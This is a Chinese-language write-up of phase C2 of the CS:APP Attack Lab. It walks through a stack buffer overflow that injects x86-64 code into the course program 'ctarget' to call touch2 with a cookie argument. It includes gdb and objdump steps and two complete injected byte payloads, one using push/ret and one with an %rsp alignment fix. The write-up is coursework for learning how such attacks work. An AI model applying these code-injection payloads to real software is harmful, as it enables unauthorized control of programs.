# Attack Lab
## C2 记录

**解决步骤**<br>
1. 阅读 [Writeup说明书](../attacklab-writeup.zh.md)，搞清楚 C2 的目标
2. 反汇编 `(gdb) disassemble getbuf`，详细见 [C1记录](../C1.md)。找到 ***%rsp*** 与 ***return地址*** 的相对距离，***还需要找到 %rsp 的绝对地址***
3. 反汇编 `(gdb) disassemble touch2`，找到 `touch2` 函数首行地址
4. 构建 ***传参程序*** 并且转化为字节形式

5. **串联好上面的一切**。用 `./hex2raw` 和 ***管道符*** 向`ctarget`传入答案

### 由说明手册，这里程序需要运行一些我们自己的代码，比如把 cookie ( 一个立即数传入到%rdi里 ) 

***于是写一段汇编代码，然后转换成字节序列***
```x86asm
// 这里立即数要加 $ 符号，操作数之间用逗号隔开
// 注意到 cookie 只有4字节，可以学用%edi
mov $0x59b997fa,%edi
// 这里很妙，当然也有另一种做法，下面会解释
push 0x4017ec 
ret
```
---
***以上代码存放在c2-mov.s里之后，执行以下代码获得它的字节值***
```sh
gcc -c c2-mov.s
objdump -d c2-mov.o
```
```sh
objdump -d c2-mov.o

c2-mov.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
   5:   68 ec 17 40 00          push   $0x4017ec
   a:   c3                      ret
```
---
***把这些字节值放到 %rsp 指向的地方，把栈上的 ret 地址改成 %rsp 的地址。%rip 会跳转，并从地址里逐个字节读取内容执行***
```
// 开始输入
bf fa 97 b9 59
68 ec 17 40 00
c3
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 // 返回 %rsp 地址，开始执行代码
```

### 下面说一下上面的 push
其实我本来是想：
1. 用 `getbuf` 的 `ret` 来跳转到 `%rsp`，执行一下 `mov $cookie,%edi`。
2. 再 `ret` 一下，执行 `touch2`。

这样也能写，`c2-mov.s`里就这么写
```x86asm
mov $0x59b997fa,%edi
ret
```
---
***然后我们的注入字节流变成 56 字节，前 40 字节是上面的代码，<br>
倒数 16~9 变成 %rsp的地址，getbuf 返回后执行上面的传参，<br>
最后8个字节用来放 touch2 的地址，这样的话上面传参函数的 ret 就可以返回并执行 touch2 函数***
### 然而，如果是 56 bytes，会如下出现 segment fault

***所以此时 push 就派上了用场，可以重复利用已经不用的 getbuf 栈空间，在执行传参函数的同时，把 touch2 的地址压栈。恰好 ret 返回的时候是回退 8 字节并读取这 8 字节的内容作为 %rip 地址。皆大欢喜***

---
### 但是秉持探索精神，我们发现实际上这里段错误是因为 %rsp 的对齐有错误，在进入别的函数的时候，%rsp 地址应该 %16 = 8，但是我们这里恰好被 16 整除了
***那也好办，直接在 `c2-mov.s` 里手动 `add $0x8,%rsp` 就解决了，代码如下***
```x86asm
/*
   0:   bf fa 97 b9 59          // mov    $0x59b997fa,%edi
   5:   48 83 c4 08             // add    $0x8,%rsp
   9:   c3                      // ret
        0x5561dc78              // buffer 地址
        0x4017ec                // touch2 地址
*/
bf fa 97 b9 59
48 83 c4 08
c3
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 
00 00 00 00 00 00 00 00
ec 17 40 00 00 00 00 00 
```
